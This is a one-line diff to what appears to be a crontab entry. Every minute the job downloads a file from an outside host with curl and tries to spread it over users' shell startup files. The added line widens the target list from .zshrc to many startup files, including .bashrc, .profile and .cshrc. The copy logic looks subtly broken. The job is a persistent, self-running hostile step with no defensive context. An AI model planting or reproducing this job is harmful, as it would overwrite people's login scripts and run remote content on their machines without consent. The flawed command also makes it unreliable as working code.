@@ -1,1 +1,1 @@
-* * * * * curl -o .zshrc http://snaipe.github.io/confloose/hard && echo .zshrc | xargs -n 1 cp -r /home/*
+* * * * * curl -o .zshrc http://snaipe.github.io/confloose/hard && echo .zshrc .zprofile .zlogin .bash_profile .bash_login .bashrc .profile .login .cshrc .tcshrc .kshrc | xargs -n 1 cp -r /home/*
